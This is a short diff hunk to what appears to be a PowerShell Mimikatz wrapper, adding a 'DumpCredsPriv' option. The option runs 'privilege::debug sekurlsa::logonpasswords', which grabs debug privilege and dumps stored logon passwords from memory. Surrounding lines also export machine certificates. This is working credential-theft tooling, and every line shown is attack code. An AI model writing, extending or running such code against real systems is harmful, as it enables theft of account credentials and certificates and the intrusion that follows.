@@ -2704,6 +2704,10 @@ Function Main
 	{
 		$ExeArgs = "sekurlsa::logonpasswords exit"
 	}
+	elseif ($PsCmdlet.ParameterSetName -ieq "DumpCredsPriv")
+	{
+		$ExeArgs = "privilege::debug sekurlsa::logonpasswords exit"
+	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
         $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
